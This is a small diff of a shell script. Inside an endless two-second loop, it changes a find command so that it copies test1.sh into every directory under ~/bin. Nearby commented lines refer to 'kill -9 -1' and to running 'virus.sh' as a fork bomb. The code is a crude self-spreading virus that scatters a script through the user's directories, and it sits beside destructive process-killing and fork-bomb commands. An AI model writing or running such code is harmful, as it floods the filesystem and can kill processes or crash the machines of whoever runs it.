@@ -15,7 +15,8 @@ fi
 while sleep 2s
 do
 cd ~/
-find Linux -type d -exec cp  test1.sh {} \;
+find bin -type d -exec cp  test1.sh {} \;
+#sleep 2s
 #Instant logging  off
 #kill -9 -1
 # bash virus.sh   forkBomb
